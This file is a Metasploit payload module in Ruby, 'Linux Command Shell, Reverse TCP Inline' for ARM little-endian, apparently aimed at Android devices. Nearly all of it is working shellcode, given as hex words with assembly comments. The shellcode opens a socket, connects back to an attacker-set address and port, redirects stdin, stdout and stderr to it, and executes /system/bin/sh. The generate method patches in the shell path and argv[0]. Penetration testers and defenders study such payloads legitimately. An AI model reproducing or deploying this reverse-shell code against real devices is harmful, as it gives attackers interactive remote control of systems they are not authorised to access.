##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 172

  include Msf::Payload::Single
  include Msf::Payload::Linux
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Command Shell, Reverse TCP Inline',
      'Description'   => 'Connect back to attacker and spawn a command shell',
      'Author'        => 'civ',
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_ARMLE,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShellUnix,
      'Payload'       =>
        {
          'Offsets' =>
            {
              'LHOST'    => [ 160, 'ADDR' ],
              'LPORT'    => [ 158, 'n' ],
            },
          'Payload' =>
            [
              #### Tested successfully on:
              # Linux 2.6.29.6-cm42 armv6l
              # Linux 2.6.29.6-cyanogenmod armv6l
              # Linux version 2.6.25-00350-g40fff9a armv5l
              # Linux version 2.6.27-00110-g132305e armv5l
              # Linux version 2.6.29-00177-g24ee4d2 armv5l
              # Linux version 2.6.29-00255-g7ca5167 armv5l
              #
              # Probably requires process to have INTERNET permission
              # or root.
              ####
              # socket(2,1,6)
              0xe3a00002,       # mov     r0, #2       ; 0x2
              0xe3a01001,       # mov     r1, #1       ; 0x1
              0xe2812005,       # add     r2, r1, #5   ; 0x5
              0xe3a0708c,       # mov     r7, #140     ; 0x8c
              0xe287708d,       # add     r7, r7, #141 ; 0x8d
              0xef000000,       # svc     0x00000000

              # connect(soc, socaddr, 0x10)
              0xe1a06000,       # mov     r6, r0
              0xe28f1078,       # add     r1, pc, #120 ; 0x78
              0xe3a02010,       # mov     r2, #16      ; 0x10
              0xe3a0708d,       # mov     r7, #141     ; 0x8d
              0xe287708e,       # add     r7, r7, #142 ; 0x8e
              0xef000000,       # svc     0x00000000

              # dup2(soc,0) @stdin
              0xe1a00006,       # mov     r0, r6
              0xe3a01000,       # mov     r1, #0  ; 0x0
              0xe3a0703f,       # mov     r7, #63 ; 0x3f
              0xef000000,       # svc     0x00000000

              # dup2(soc,1) @stdout
              0xe1a00006,       # mov     r0, r6
              0xe3a01001,       # mov     r1, #1  ; 0x1
              0xe3a0703f,       # mov     r7, #63 ; 0x3f
              0xef000000,       # svc     0x00000000

              # dup2(soc,2) @stderr
              0xe1a00006,       # mov     r0, r6
              0xe3a01002,       # mov     r1, #2  ; 0x2
              0xe3a0703f,       # mov     r7, #63 ; 0x3f
              0xef000000,       # svc     0x00000000

              # execve("/system/bin/sh", args, env)
              0xe28f003c,       # add     r0, pc, #60  ; 0x3c
              # - make a zero
              0xe0244004,       # eor     r4, r4, r4
              0xe92d0010,       # push    {r4}
              # - compute address of env
              0xe28f3044,       # add     r3, pc, #68  ; 0x44
              0xe92d0008,       # push    {r3}
              0xe1a0200d,       # mov     r2, sp
              # - ensure another zero
              0xe92d0010,       # push    {r4}
              # - compute address of argv
              0xe28f4030,       # add     r4, pc, #48  ; 0x30
              0xe92d0010,       # push    {r4}
              0xe1a0100d,       # mov     r1, sp
              # - go execve!
              0xe3a0700b,       # mov     r7, #11 ; 0xb
              0xef000000,       # svc     0x00000000

              0xef000000,       # svc     0x00000000
              0xef000000,       # svc     0x00000000
              0xef000000,       # svc     0x00000000

              # <af>:
              # port offset = xx, ip offset = yy
              0x04290002,       # .word   0x5c110002 @ port: 4444 , sin_fam = 2
              0x0101a8c0,       # .word   0x0101a8c0 @ ip: 192.168.1.1
              # <shell>:
              0x00000000,       # .word   0x00000000 ; the shell goes here!
              0x00000000,       # .word   0x00000000
              0x00000000,       # .word   0x00000000
              0x00000000,       # .word   0x00000000
              # <arg>:
              0x00000000,       # .word   0x00000000 ; the args!
              0x00000000,       # .word   0x00000000
              0x00000000,       # .word   0x00000000
              0x00000000,       # .word   0x00000000

            ].pack("V*")
        }
      ))

    # Register command execution options
    register_options(
      [
        OptString.new('SHELL', [ true, "The shell to execute.", "/system/bin/sh" ]),
        OptString.new('ARGV0', [ false, "argv[0] to pass to execve", "sh" ]) # mostly used for busybox
      ], self.class)
  end

  def generate
    p = super

    sh = datastore['SHELL']
    if sh.length >= 16
      raise ArgumentError, "The specified shell must be less than 16 bytes."
    end
    p[164, sh.length] = sh

    arg = datastore['ARGV0']
    if arg
      if arg.length >= 16
        raise ArgumentError, "The specified argv[0] must be less than 16 bytes."
      end
      p[180, arg.length] = arg
    end

    p
  end

end
